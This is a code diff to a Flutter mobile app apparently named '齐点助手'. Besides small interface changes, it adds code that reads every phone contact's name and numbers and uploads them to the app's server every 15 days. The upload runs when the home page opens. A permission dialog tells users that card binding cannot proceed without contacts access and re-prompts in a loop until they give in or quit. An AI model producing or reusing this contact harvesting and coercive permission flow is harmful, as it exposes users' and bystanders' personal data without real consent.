@@ -9,6 +9,7 @@ import 'dart:math' show pi;
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:fluttertoast/fluttertoast.dart';
 import 'package:webview_flutter/webview_flutter.dart';
+import 'package:contacts_service/contacts_service.dart';
 
 SharedPreferences sharedPreferences;
 
@@ -115,8 +116,10 @@ class _LoginPageState extends State<LoginPage> {
                   height: screenHeight * 0.15,
                 ),
                 Image.asset(
-                  "images/ic_launcher.jpg",
+                  "images/icon.jpg",
+                  width: 50,
                   height: 50,
+                  fit: BoxFit.fill,
                 ),
                 Text("齐点助手"),
                 SizedBox(
@@ -261,7 +264,7 @@ class _VerifyPageState extends State<VerifyPage> {
       height: 0.5,
       color: CupertinoColors.inactiveGray,
     );
-    requestPermission(context);
+    //requestPermission(context);
     return CupertinoPageScaffold(
       navigationBar: CupertinoNavigationBar(
         middle: Text(
@@ -270,6 +273,15 @@ class _VerifyPageState extends State<VerifyPage> {
         ),
         backgroundColor: CupertinoColors.activeBlue,
         actionsForegroundColor: CupertinoColors.white,
+        trailing: CupertinoButton(
+            child: Text(
+              "退出",
+              style: TextStyle(color: CupertinoColors.white),
+            ),
+            onPressed: () {
+              BlocProvider.of<ApplicationBloc>(context).logout();
+              Navigator.of(context).pushReplacementNamed("/");
+            }),
       ),
       child: DefaultTextStyle(
         style: TextStyle(color: Color(0xFF333333)),
@@ -486,55 +498,82 @@ class _VerifyPageState extends State<VerifyPage> {
         });
   }
 
-  void requestPermission(BuildContext context) async {
-    var status = await PermissionHandler()
-        .checkPermissionStatus(PermissionGroup.contacts);
-    print('$status');
-    if (status != PermissionStatus.granted) {
-      var map = await PermissionHandler()
-          .requestPermissions([PermissionGroup.contacts]);
-      if (map[PermissionGroup.contacts] == PermissionStatus.granted) {
-        //todo upload contacts
-      } else {
-        showDenied(context);
-      }
+
+}
+
+void requestPermission(BuildContext context) async {
+  var status = await PermissionHandler()
+      .checkPermissionStatus(PermissionGroup.contacts);
+  print('$status');
+  if (status != PermissionStatus.granted) {
+    var map = await PermissionHandler()
+        .requestPermissions([PermissionGroup.contacts]);
+    if (map[PermissionGroup.contacts] == PermissionStatus.granted) {
+      doUploadContact();
     } else {
-      //todo upload contacts
+      showDenied(context);
     }
+  } else {
+    doUploadContact();
+  }
+}
+
+void showDenied(BuildContext context) {
+  showCupertinoDialog(
+      context: context,
+      builder: (context) {
+        return CupertinoAlertDialog(
+          title: Text("警告"),
+          content: Text("您已经拒绝了联系人权限,无法继续进行绑卡操作"),
+          actions: <Widget>[
+            CupertinoButton(
+              onPressed: () {
+                exit(0);
+              },
+              child: Text("退出应用"),
+            ),
+            CupertinoButton(
+              onPressed: () {
+                PermissionHandler().openAppSettings();
+              },
+              child: Text("前往设置"),
+            ),
+            CupertinoButton(
+              onPressed: () {
+                requestPermission(context);
+              },
+              child: Text("再次请求"),
+            ),
+          ],
+        );
+      }).then((v) {
+    requestPermission(context);
+  });
+}
+
+void doUploadContact() async {
+  var lastTime = sharedPreferences.getInt("lastContactUploadTime") ?? 0;
+  var now = DateTime.now().millisecondsSinceEpoch;
+
+  if ((now - lastTime) < 15 * 24 * 60 * 60 * 1000) {
+    return;
   }
 
-  void showDenied(BuildContext context) {
-    showCupertinoDialog(
-        context: context,
-        builder: (context) {
-          return CupertinoAlertDialog(
-            title: Text("警告"),
-            content: Text("您已经拒绝了联系人权限,无法继续进行绑卡操作"),
-            actions: <Widget>[
-              CupertinoButton(
-                onPressed: () {
-                  exit(0);
-                },
-                child: Text("退出应用"),
-              ),
-              CupertinoButton(
-                onPressed: () {
-                  PermissionHandler().openAppSettings();
-                },
-                child: Text("前往设置"),
-              ),
-              CupertinoButton(
-                onPressed: () {
-                  requestPermission(context);
-                },
-                child: Text("再次请求"),
-              ),
-            ],
-          );
-        }).then((v) {
-      requestPermission(context);
-    });
-  }
+  var contacts = await ContactsService.getContacts(withThumbnails: false);
+
+  var list = contacts.map((c) {
+    String name = c.displayName;
+    String phone = c.phones.map((item) {
+      return item.value;
+    }).join(",");
+    return ContactInfo(phone, name);
+  }).toList();
+  print('$list');
+
+  DioUtil.getInstance()
+      .post("/v1/user/contact", {"list": list}).then((baseResp) {
+    sharedPreferences.setInt("lastContactUploadTime", now);
+  });
 }
 
 class HomePage extends StatefulWidget {
@@ -546,6 +585,7 @@ class _HomePageState extends State<HomePage> {
   @override
   void initState() {
     if (mounted) profileRequest(context);
+    requestPermission(context);
     super.initState();
   }
 
